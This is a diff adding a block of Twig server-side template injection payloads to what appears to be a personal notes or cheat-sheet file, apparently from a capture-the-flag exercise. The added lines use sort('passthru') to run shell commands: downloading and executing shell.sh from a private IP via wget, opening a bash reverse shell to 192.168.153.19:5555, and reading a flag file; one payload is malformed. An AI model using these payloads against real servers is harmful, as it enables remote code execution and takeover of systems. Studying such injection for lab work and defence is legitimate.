@@ -157,6 +157,31 @@ Alternatively, the following payload, which harnesses the built-in _context vari
 
 it only works on `Twig 2.10+` with `map` enabled.
 
+```twig
+{{["wget http://10.9.0.14:8087/shell.sh -o /tmp/shell.sh", ""] | sort('passthru') }}
+{['id',"]|sort('passthru')|join}}
+
+
+
+bash -i >& /dev/tcp/192.168.153.19/5555 0>&1
+
+{{["bash -i >& /dev/tcp/192.168.153.19/5555 0>&1", ""] | sort('passthru')}}
+
+{{["wget http://192.168.153.19:8000/shell.sh -o /tmp/shell.sh", ""] | sort('passthru')}}
+
+
+
+{{["ls -al flags", ""] | sort('passthru')}}
+{{["chmod +x /tmp/shell.sh", ""] | sort('passthru')}}
+{{["sh /tmp/shell.sh", ""] | sort('passthru')}}
+{{["sh shell", ""] | sort('passthru')}}
+
+5d8af1dc14503c7e4bdc8e51a3469f48.txt
+
+{{["cat flags/5d8af1dc14503c7e4bdc8e51a3469f48.txt", ""] | sort('passthru')}}
+
+```
+
 ---
 ---
 ---
